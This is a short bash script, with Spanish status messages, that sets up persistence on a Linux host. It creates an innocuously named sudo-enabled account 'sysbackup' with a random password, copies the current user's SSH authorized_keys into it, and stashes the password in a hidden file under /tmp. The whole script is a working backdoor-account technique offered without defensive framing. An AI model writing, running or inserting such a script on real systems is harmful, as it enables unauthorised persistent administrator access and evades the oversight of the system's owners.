#!/bin/bash

USER="sysbackup"
PASSWORD=$(openssl rand -base64 12)

echo "[+] Creando usuario persistente..."

sudo useradd -m -s /bin/bash $USER
echo "$USER:$PASSWORD" | sudo chpasswd
sudo usermod -aG sudo $USER

mkdir -p /home/$USER/.ssh
cp ~/.ssh/authorized_keys /home/$USER/.ssh/ 2>/dev/null

sudo chown -R $USER:$USER /home/$USER/.ssh
chmod 700 /home/$USER/.ssh
chmod 600 /home/$USER/.ssh/authorized_keys

echo $PASSWORD > /tmp/.persist_pass

echo "[+] Usuario creado: $USER"
